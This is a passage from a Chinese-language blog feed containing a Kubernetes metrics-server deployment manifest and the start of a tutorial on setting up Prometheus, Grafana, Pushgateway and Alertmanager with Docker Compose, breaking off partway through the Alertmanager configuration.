class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl edit deployment metrics-server -n kube-system<br></code></pre></td></tr></table></figure><p>components.yaml参考配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>    <span class="hljs-attr">rbac.authorization.k8s.io/aggregate-to-admin:</span> <span class="hljs-string">&quot;true&quot;</span><br>    <span class="hljs-attr">rbac.authorization.k8s.io/aggregate-to-edit:</span> <span class="hljs-string">&quot;true&quot;</span><br>    <span class="hljs-attr">rbac.authorization.k8s.io/aggregate-to-view:</span> <span class="hljs-string">&quot;true&quot;</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">system:aggregated-metrics-reader</span><br><span class="hljs-attr">rules:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">metrics.k8s.io</span><br>  <span class="hljs-attr">resources:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pods</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">nodes</span><br>  <span class="hljs-attr">verbs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">get</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">list</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">watch</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">system:metrics-server</span><br><span class="hljs-attr">rules:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attr">resources:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">nodes/metrics</span><br>  <span class="hljs-attr">verbs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">get</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attr">resources:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pods</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">nodes</span><br>  <span class="hljs-attr">verbs:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">get</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">list</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">watch</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">RoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server-auth-reader</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">Role</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">extension-apiserver-authentication-reader</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server:system:auth-delegator</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">system:auth-delegator</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRoleBinding</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">system:metrics-server</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">system:metrics-server</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">https</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">443</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-string">https</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">strategy:</span><br>    <span class="hljs-attr">rollingUpdate:</span><br>      <span class="hljs-attr">maxUnavailable:</span> <span class="hljs-number">0</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">args:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--cert-dir=/tmp</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--secure-port=4443</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--kubelet-use-node-status-port</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--metric-resolution=15s</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">--kubelet-insecure-tls</span> <br>        <span class="hljs-attr">image:</span> <span class="hljs-string">bitnami/metrics-server:latest</span><br>        <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span><br>        <span class="hljs-attr">livenessProbe:</span><br>          <span class="hljs-attr">failureThreshold:</span> <span class="hljs-number">3</span><br>          <span class="hljs-attr">httpGet:</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/livez</span><br>            <span class="hljs-attr">port:</span> <span class="hljs-string">https</span><br>            <span class="hljs-attr">scheme:</span> <span class="hljs-string">HTTPS</span><br>          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">4443</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">https</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>        <span class="hljs-attr">readinessProbe:</span><br>          <span class="hljs-attr">failureThreshold:</span> <span class="hljs-number">3</span><br>          <span class="hljs-attr">httpGet:</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/readyz</span><br>            <span class="hljs-attr">port:</span> <span class="hljs-string">https</span><br>            <span class="hljs-attr">scheme:</span> <span class="hljs-string">HTTPS</span><br>          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">20</span><br>          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span><br>        <span class="hljs-attr">resources:</span><br>          <span class="hljs-attr">requests:</span><br>            <span class="hljs-attr">cpu:</span> <span class="hljs-string">100m</span><br>            <span class="hljs-attr">memory:</span> <span class="hljs-string">200Mi</span><br>        <span class="hljs-attr">securityContext:</span><br>          <span class="hljs-attr">allowPrivilegeEscalation:</span> <span class="hljs-literal">false</span><br>          <span class="hljs-attr">readOnlyRootFilesystem:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">runAsNonRoot:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">runAsUser:</span> <span class="hljs-number">1000</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/tmp</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">tmp-dir</span><br>      <span class="hljs-attr">nodeSelector:</span><br>        <span class="hljs-attr">kubernetes.io/os:</span> <span class="hljs-string">linux</span><br>      <span class="hljs-attr">priorityClassName:</span> <span class="hljs-string">system-cluster-critical</span><br>      <span class="hljs-attr">serviceAccountName:</span> <span class="hljs-string">metrics-server</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">emptyDir:</span> &#123;&#125;<br>        <span class="hljs-attr">name:</span> <span class="hljs-string">tmp-dir</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apiregistration.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">APIService</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">metrics-server</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">v1beta1.metrics.k8s.io</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">group:</span> <span class="hljs-string">metrics.k8s.io</span><br>  <span class="hljs-attr">groupPriorityMinimum:</span> <span class="hljs-number">100</span><br>  <span class="hljs-attr">insecureSkipTLSVerify:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">service:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">metrics-server</span><br>    <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-string">v1beta1</span><br>  <span class="hljs-attr">versionPriority:</span> <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好的,我来为您整理一篇安装Kubernetes Dashboard的教程。以下是教程内容:&lt;/p&gt;
&lt;h1 id=&quot;Kubernetes-Dashboard安装教程&quot;&gt;&lt;a href=&quot;#Kubernetes-Dashboard安装教程&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="Kubernetes" scheme="http://example.com/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Alertmanager告警配置</title>
    <link href="http://example.com/2024/07/31/Alertmanager%E5%91%8A%E8%AD%A6%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2024/07/31/Alertmanager%E5%91%8A%E8%AD%A6%E9%85%8D%E7%BD%AE/</id>
    <published>2024-07-31T07:45:22.000Z</published>
    <updated>2024-09-01T08:44:01.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prometheus和Alertmanager配置教程"><a href="#Prometheus和Alertmanager配置教程" class="headerlink" title="Prometheus和Alertmanager配置教程"></a>Prometheus和Alertmanager配置教程</h1><p>使用Docker Compose搭建Prometheus监控系统，并配置Alertmanager进行告警管理。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li><a href="#docker-compose%E9%85%8D%E7%BD%AE">Docker Compose配置</a></li><li><a href="#prometheus%E9%85%8D%E7%BD%AE">Prometheus配置</a></li><li><a href="#alertmanager%E9%85%8D%E7%BD%AE">Alertmanager配置</a></li><li><a href="#%E5%91%8A%E8%AD%A6%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE">告警规则配置</a></li></ol><h2 id="Docker-Compose配置"><a href="#Docker-Compose配置" class="headerlink" title="Docker Compose配置"></a>Docker Compose配置</h2><p>首先，使用Docker Compose来部署Prometheus、Grafana、Pushgateway和Alertmanager。</p><p>创建一个<code>docker-compose.yml</code>文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">prometheus:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/prometheus</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9090:9090&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/prometheus/prometheus.yml:/etc/prometheus/prometheus.yml</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/rules:/etc/prometheus/rules</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--storage.tsdb.path=/prometheus&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.libraries=/usr/share/prometheus/console_libraries&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.templates=/usr/share/prometheus/consoles&#x27;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">grafana:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/grafana</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">grafana</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3000:3000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/grafana_data:/var/lib/grafana</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">pushgateway:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/pushgateway</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">pushgateway</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9091:9091&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/pushgateway_data:/var/lib/pushgateway</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">alertmanager:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/alertmanager</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">alertmanager</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9093:9093&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/alertmanager:/etc/alertmanager</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/alertmanager_data:/var/lib/alertmanager</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">net-prometheus:</span><br></code></pre></td></tr></table></figure><p>这个配置文件定义了四个服务：Prometheus、Grafana、Pushgateway和Alertmanager。建议使用固定版本镜像，配置相应的端口映射和卷挂载。</p><h2 id="Prometheus配置"><a href="#Prometheus配置" class="headerlink" title="Prometheus配置"></a>Prometheus配置</h2><p>接下来，我们需要配置Prometheus。在对应映射目录创建<code>prometheus.yml</code>文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">global:</span><br>  <span class="hljs-attr">scrape_interval:</span>     <span class="hljs-string">5s</span><br>  <span class="hljs-attr">evaluation_interval:</span> <span class="hljs-string">5s</span><br><br>  <span class="hljs-attr">external_labels:</span><br>    <span class="hljs-attr">monitor:</span> <span class="hljs-string">&#x27;dashboard&#x27;</span><br><br><span class="hljs-attr">alerting:</span><br>  <span class="hljs-attr">alertmanagers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">static_configs:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;alertmanager:9093&quot;</span><br>    <span class="hljs-attr">timeout:</span> <span class="hljs-string">30s</span><br><br><span class="hljs-attr">rule_files:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/prometheus/rules/*.rules</span><br><br><span class="hljs-attr">scrape_configs:</span>  <br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">&#x27;prometheus&#x27;</span><br>    <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">5s</span><br>    <span class="hljs-attr">static_configs:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">&#x27;prometheus:9090&#x27;</span>]<br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">&quot;Windows&quot;</span><br>    <span class="hljs-attr">static_configs:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">&quot;your_windows_host:9182&quot;</span>]<br></code></pre></td></tr></table></figure><p>这个配置文件定义了全局设置、告警管理器、规则文件位置和抓取配置。your_windows_host&#96;你实际的Windows主机地址。</p><h2 id="Alertmanager配置"><a href="#Alertmanager配置" class="headerlink" title="Alertmanager配置"></a>Alertmanager配置</h2><p>在对应映射目录创建<code>alertmanager.yml</code>文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">global:</span><br>  <span class="hljs-attr">resolve_timeout:</span> <span class="hljs-string">5m</span><br>  <span class="hljs-attr">smtp_smarthost:</span> <span class="hljs-string">&#x27;smtp.example.com:465&#x27;</span><br>  <span class="hljs-attr">smtp_from:</span> <span class="hljs-string">&#x27;alertmanager@example.com&#x27;</span><br>  <span class="hljs-attr">smtp_auth_username:</span> <span class="hljs-string">&#x27;alertmanager@example.com&#x27;</span><br>  <span class="hljs-attr">smtp_auth_password:</span> <span class="hljs-string">&#x27;your_smtp_password&#x27;</span><br>  <span class="hljs-attr">smtp_require_tls:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-attr">route:</span><br>  <span class="hljs-attr">group_by:</span> [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  <span class="hljs-attr">group_wait:</span> <span class="hljs-string">30s</span><br>  <span class="hljs-attr">group_interval:</span> <span class="hljs-string">5m</span><br>  <span class="hljs-attr">repeat_interval:</span> <span class="hljs-string">3h</span><br>  <span class="hljs-attr">receiver:</span> <span class="hljs-string">&#x27;email-notifications&#x27;</span><br><br><span class="hljs-attr">receivers:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;email-notifications&#x27;</span><br>  <span 